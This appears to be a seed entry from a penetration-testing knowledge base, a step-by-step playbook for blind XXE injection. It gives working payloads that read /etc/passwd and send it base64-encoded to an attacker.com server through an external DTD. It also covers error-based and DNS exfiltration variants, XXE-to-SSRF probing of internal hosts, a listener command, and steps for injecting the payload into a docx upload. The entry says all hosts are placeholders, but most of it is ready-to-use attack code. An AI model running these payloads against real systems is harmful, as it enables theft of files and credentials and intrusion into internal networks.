# [Seed] XXE Blind Injection OOB → Takeaway /etc/passwd and Intranet Detection

## Scene classification
Penetration Testing/Web Exploitation

## Goal Overview
A certain web interface accepts XML request body (SOAP/upload docx parsing/custom API) without echoing the content (i.e. "blind XXE"). Use the external DTD + parameter entity trick to bring the target file back to the attacker's server.

## Complete execution link

1. Detection point
- Any Content-Type including `xml` / `soap` / File upload docx/xlsx/pptx (including XML) / SVG
- Inject the test payload and check the response: error / delay / OOB connection back
2. First try a simple XXE with echo
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```
3. No echo but OOB pass → Use external DTD
- Put evil.dtd on your VPS
- Trigger server loading and takeout
4. OOB is also not working → See if error-based / blind boolean can be used
5. Expand the surface after getting /etc/passwd:
- Intranet port scanning (XXE → SSRF)
- Read application configuration file (database password/private key)
- Trigger SSRF cloud metadata → see seed-006

## Trampling on pit records

| Problem | Cause | Solution | Time consuming |
|------|------|---------|------|
| Direct SYSTEM "file://" error | The parser has disabled ENTITY references | Use parameter entity (%) nesting instead | 30min |
| File contains `<` `>` `&` causing DTD parsing explosion | XML specification prohibits special characters in parameter entities | Use `php://filter` to wrap a layer of base64 | 40min |
| OOB server port 80 receives a return connection but the payload is not spliced | The number of DTD nesting levels is wrong | Strictly control the OOB template (outer layer + inner layer) | 1h |
| File read but only half read | XML limit entity length (XML_MAX_TOKEN_BYTES) | Fragmented read + offset | 1h |
| Intranet SSRF is all connection refused | The network segment where the application is located does not have internal services | Change localhost / 127.0.0.1 / internal service name (K8s) | 30min |
| Java application cannot be connected | Java default XML parser has disabled SYSTEM | Try `jar:` protocol / or change the SOAP interface. You may be using an old version of Apache Xerces | A few hours |

## Toolchain discovery

- **XXEinjector** Automated XXE exploits (Ruby)
- **Burp Collaborator** / **interactsh** are a must for OOB
- **dnslog.cn / oast.online** Domestic/foreign DNS-only OOB
- Upload file scenario: **docx is zip + xml**, change word/document.xml and then compress it back to inject it
- **payloads-all-the-things** XXE chapter is the most complete cheatsheet

## Key code/command

OOB standard two-layer DTD (with base64 file inside and outside):

**evil.dtd (placed on attacker VPS)**:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8000/exfil?d=%file;'>">
%all;
```

**Target request body**:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://attacker.com:8000/evil.dtd">
  %remote;
  %send;
]>
<r>any</r>
```

**The attacker starts the HTTP service to collect data**:

```bash
python3 -m http.server 8000
# Received GET /exfil?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=' | base64 -d
# → root:x:0:0:root:/root:/bin/bash
```

XXE → SSRF intranet scan:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://172.16.0.10:8080/admin">]>
<r>&x;</r>
```

Error echo (error-based) - Let the XML parser return content in the error message:

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<r>x</r>
```

**docx upload XXE** (many document processing applications are affected):

```bash
unzip target.docx -d unpacked/
# Edit unpacked/word/document.xml, change the beginning to:
# <?xml version="1.0"?>
# <!DOCTYPE w:document [...XXE payload...]>
zip -r evil.docx unpacked/*
# Upload evil.docx
```

## Suggestions for improving this package

- `pentest-tools/references/web-attack-cheatsheet.md` should have XXE complete chapters (OOB/error/blind/docx upload/svg)
- Add interactsh-client to bootstrap manifest (if not already)
- routing already contains XXE, but it is recommended to explicitly add "XXE OOB out-of-band" routing

## Reusable patterns/script snippets

**XXE type decision tree**:

```text
There is an echo → Directly output SYSTEM "file://"
The error report is echoed → error-based payload (two levels of nesting + intentional triggering of parsing failure)
No echo at all → OOB standard two-layer DTD (DNS / HTTP)
DNS is accessible but HTTP is not accessible → Use DNS exfil (base32 encoded to make subdomain)
```

**XXE protocol list (tested by parser)**:

```text
file:// → read local files (most common)
http://, https:// → SSRF
ftp:// → Older versions of Java also support
gopher:// → very few PHP parsers
expect:// → PHP can execute the command when installing the expect extension
jar:// → Java decompresses files in remote jar
netdoc:// → old version of Java instead of file://
```

**DNS exfil (weakest channel)**:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; ext SYSTEM 'http://%file;.attacker.com/x'>">
%eval;
%ext;
<!-- DNS log received hostname.attacker.com -->
```

## Evolution action
- [ ] web-attack-cheatsheet.md Added XXE complete chapter
- [ ] bootstrap-manifest check interactsh-client
- [x] routing already contains XXE entry

## Environment information
- Attacker VPS (public IP, open 80/8000/53)
- Target: Any web that accepts XML input (PHP/Java/Python lxml/.NET are affected)
- OOB: interactsh / dnslog.cn / self-built DNS

## Desensitization requirements
This entry is seed data, written based on public web vulnerability exploitation patterns, and does not involve real production targets. All domain names/IPs are placeholders.